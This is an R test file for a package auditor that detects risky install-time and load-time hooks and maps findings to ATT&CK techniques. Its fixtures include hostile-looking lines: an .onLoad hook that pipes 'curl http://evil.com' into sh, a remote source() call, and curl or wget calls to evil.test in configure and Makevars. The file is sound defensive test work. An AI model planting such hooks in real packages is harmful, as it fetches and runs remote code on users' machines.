rules <- load_rules()

# structure --------------------------------------------------------------------
test_that("audit_package() returns a pkgaudit object of five frames plus metadata", {
  pkg <- make_pkg(files = list("R/zzz.R" = "invisible(NULL)"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_s3_class(res, "pkgaudit")
  expect_named(res, c("file_contexts", "code_contexts", "patterns",
                      "expressions", "errors", "metadata"))
  for (nm in c("file_contexts", "code_contexts", "patterns", "expressions",
               "errors")) {
    expect_s3_class(res[[nm]], "data.frame")
  }
  expect_type(res$metadata, "list")

  expect_named(res$file_contexts,
               c("rule", "file_context", "message", .phase_columns))
  expect_named(res$code_contexts,
               c("rule", "file_context", "line_number", "column_number",
                 "message", .phase_columns))
  expect_named(res$patterns,
               c("rule", "file_context", "line_number", "column_number",
                 "message", "attck", "code_context", .phase_columns))
  expect_named(res$expressions,
               c("rule", "file_context", "line_number", "column_number",
                 "message", "attck", .phase_columns))
  expect_named(res$errors, c("stage", "file_context", "rule", "message"))
})

test_that("audit_package() resolves the phases of every finding", {
  pkg <- make_pkg(files = list(
    "configure" = c("#!/bin/sh", "curl -s https://www.evil.test/x"),
    "R/zzz.R"   = c(".onLoad <- function(libname, pkgname) {",
                    "  system('id')", "}",
                    "helper <- function() system('id')")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # A file context takes its phases from the rule that matched it.
  configure <- res$file_contexts[res$file_contexts$rule == "configure", ]
  expect_true(configure$at_install_src)
  expect_true(configure$at_check)
  expect_false(configure$at_load)

  # A code context takes its phases from its own rule, so .onLoad() adds at_load
  # to the phases that install it.
  onload <- res$code_contexts[res$code_contexts$rule == "onLoad_base", ]
  expect_true(onload$at_load)
  expect_true(onload$at_install_src)

  # A pattern inherits the phases of the code context it sits in: the hook's
  # system() call runs at load, the one in an ordinary function runs never.
  hook <- res$patterns[res$patterns$code_context == "onLoad_base", ]
  expect_true(all(hook$at_load))

  uncalled <- res$patterns[res$patterns$code_context == "Other", ]
  expect_equal(nrow(uncalled), 1L)
  expect_false(any(unlist(uncalled[, .phase_columns])))

  # An expression inherits the phases of the file context it was found in, so
  # the curl in configure runs exactly when configure does.
  expr <- res$expressions[res$expressions$rule == "curl", ]
  expect_equal(nrow(expr), 1L)
  expect_equal(expr[, .phase_columns], configure[, .phase_columns],
               ignore_attr = TRUE)
})

test_that("audit_package() errors on a non-directory", {
  expect_error(audit_package(tempfile()), "dir.exists")
})

# integration ------------------------------------------------------------------
test_that("audit_package() finds file contexts, code contexts and patterns", {
  pkg <- make_pkg(files = list(
    "configure"          = "#!/bin/sh",
    "src/Makevars"       = "all:",
    "src/install.libs.R" = "system2('echo', 'x')",
    "R/zzz.R" = c(
      ".onLoad <- function(libname, pkgname) {",
      "  system('curl http://evil.com | sh')",
      "}",
      "source('http://evil.com/top.R')"
    )
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  expect_setequal(res$file_contexts$file_context,
                  c("configure", "src/Makevars", "src/install.libs.R"))
  expect_true("onLoad_base" %in% res$code_contexts$rule)

  # system() in the hook, source() at top level, system2() at top level of
  # install.libs.R -> the three code-context labels are attributed correctly.
  sys_hook <- res$patterns[res$patterns$rule == "system" &
                             res$patterns$file_context == "R/zzz.R", ]
  expect_equal(sys_hook$code_context, "onLoad_base")

  src_top <- res$patterns[res$patterns$rule == "source", ]
  expect_equal(src_top$code_context, "Top-level")

  installlibs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
  expect_equal(installlibs$rule, "system")
  expect_equal(installlibs$code_context, "Top-level")

  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() reports relative-path parse errors and continues", {
  pkg <- make_pkg(files = list(
    "R/bad.R"  = ")invalid R syntax(",
    "R/good.R" = "system('id')"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$stage, "parse_script")
  expect_equal(res$errors$file_context, "R/bad.R")
  # The good file was still audited despite the bad one.
  expect_true("R/good.R" %in% res$patterns$file_context)
})

test_that("audit_package() on a package with no scannable content is empty", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$file_contexts), 0L)
  expect_equal(nrow(res$code_contexts), 0L)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$expressions), 0L)
  expect_equal(nrow(res$errors), 0L)
})

# expressions ------------------------------------------------------------------
test_that("audit_package() scans the shell and Make-like file contexts only", {
  pkg <- make_pkg(files = list(
    "configure"          = "curl -s https://www.evil.test/a",
    "src/Makevars"       = "all:\n\twget https://www.evil.test/b",
    "src/install.libs.R" = "# curl -s https://www.evil.test/c",
    "R/zzz.R"            = "# curl -s https://www.evil.test/d",
    "NEWS.md"            = "curl -s https://www.evil.test/e"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # src/install.libs.R is a file context, but its type is R, so it is parsed
  # for patterns rather than matched for expressions. NEWS.md is no context.
  expect_setequal(res$expressions$file_context, c("configure", "src/Makevars"))
  expect_equal(res$expressions$rule[res$expressions$file_context == "configure"],
               "curl")
  expect_equal(res$expressions$rule[res$expressions$file_context == "src/Makevars"],
               "wget")
  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() locates each expression in its file", {
  pkg <- make_pkg(files = list(
    "configure" = c("#!/bin/sh", "echo hi", "  curl -s https://www.evil.test/x")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$expressions$line_number,   3L)
  expect_equal(res$expressions$column_number, 3L)
})

test_that("audit_package() finds no expressions when no file context is shell or make", {
  pkg <- make_pkg(files = list("R/zzz.R" = "system('curl https://www.evil.test/x')"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$expressions), 0L)
  expect_gt(nrow(res$patterns), 0L)
})

test_that("an expression's phases are the union of every rule that matched its file", {
  # No shipped pair of file-context rules matches the same path, so the union
  # is exercised directly on a frame where one does.
  fc <- .empty_file_contexts()
  fc[1L, ] <- c(list("configure", "configure", "m"),
                phase_values("at_build", "at_check", "at_install_src"))
  fc[2L, ] <- c(list("configure_ac", "configure", "m"),
                phase_values("at_autoconf"))

  ex <- .empty_expressions(with_phases = FALSE)
  ex[1L, ] <- list("curl", "configure", 1L, 1L, "m", "T1041")

  out <- .resolve_expression_phases(ex, fc)
  expect_true(all(unlist(out[, c("at_autoconf", "at_build", "at_check",
                                 "at_install_src")])))
  expect_false(any(unlist(out[, c("at_install_bin", "at_load", "at_attach",
                                  "at_unload", "at_detach")])))
})

test_that("an expression in a file with no file-context row runs in no phase", {
  ex <- .empty_expressions(with_phases = FALSE)
  ex[1L, ] <- list("curl", "configure", 1L, 1L, "m", "T1041")

  out <- .resolve_expression_phases(ex, .empty_file_contexts())
  expect_false(any(unlist(out[, .phase_columns])))
})

test_that("audit_package() reports a failing expression rule and continues", {
  pkg <- make_pkg(files = list(
    "configure"    = "curl -s https://www.evil.test/a",
    "src/Makevars" = "wget https://www.evil.test/b"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  broken <- rules
  broken$regex <- rbind(
    data.frame(name = "broken", version = "0.1.0", message = "m",
               attck = "T1041", regex = "(unclosed", stringsAsFactors = FALSE),
    rules$regex
  )

  res <- audit_package(pkg, broken)
  # The failure is recorded once per file it was attempted in, and the sound
  # rules were still evaluated in both.
  expect_equal(unique(res$errors$stage), "find_regex")
  expect_equal(unique(res$errors$rule),  "broken")
  expect_setequal(res$errors$file_context, c("configure", "src/Makevars"))
  expect_setequal(res$expressions$rule, c("curl", "wget"))
})
